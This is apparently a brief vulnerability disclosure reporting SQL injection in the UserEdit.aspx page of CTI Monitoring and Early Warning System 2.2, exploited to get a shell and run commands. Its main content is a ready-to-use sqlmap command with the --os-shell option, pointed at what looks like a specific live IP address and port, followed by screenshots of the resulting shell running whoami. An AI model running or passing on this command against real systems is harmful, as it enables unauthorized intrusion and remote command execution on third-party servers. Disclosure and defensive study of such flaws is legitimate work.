There is a command execution vulnerability in CTI Monitoring and Early Warning System 2.2

version:v2.2

![image](https://github.com/Ox1dq/cve/assets/134667839/d5e50e98-73f5-4a20-9348-5eb7a841a23e)


In the path /Web/SysManage/UserEdit.aspx?&ID=0, you can use sqlmap to generate delayed injection and successfully getshell and perform command execution operations.

sqlmap command：```python.exe sqlmap.py -u " http://110.167.122.134:9900/ Web/SysManage/UserEdit.aspx?&ID=0" --os-shell –batch```

existence introduction


![image](https://github.com/Ox1dq/cve/assets/134667839/3b81b9ea-40a8-4680-99df-4d261d1a14b9)

Write to shell and execute the whoami command
![image](https://github.com/Ox1dq/cve/assets/134667839/9d503a8c-eed8-490c-97bf-7ea3cf0cf28e)
